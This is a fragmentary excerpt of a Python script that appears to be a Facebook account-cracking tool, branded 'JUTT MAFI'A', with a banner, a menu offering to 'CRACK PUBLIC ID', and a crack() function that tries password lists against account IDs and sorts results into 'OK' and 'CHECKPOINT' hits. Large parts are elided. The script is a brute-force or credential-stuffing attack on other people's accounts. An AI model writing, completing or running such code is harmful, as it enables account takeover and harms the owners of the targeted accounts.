...
def banner():
	clear()
	sol()
	ban=''' © MASTER MIND TRICKER JUTT MAFI'A
      _________      __________ 
______  /___  ___  /__  /_
___ _  /_  / / /  __/  __/      [ + ]   OWNER : Jutt x Majid
/ /_/ / / /_/ // /_ / /_        [ + ]   Facebook : Ali Jutt
\____/  \__,_/ \__/ \__/     [ + ]  Youtube : Awara Tricker '''
...
def menu(my_name,my_id):
	...
	print('')
	cetak(nel('[bold green] ❤️1. CRACK PUBLIC ID\n  ❤️2. CHEK RESULTS\n ❤️0. EXIT [bold green]')) 
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}JUTT-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ JUTT-CHECKPOINT ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ JUTT OK ❤️✨[green]')) 
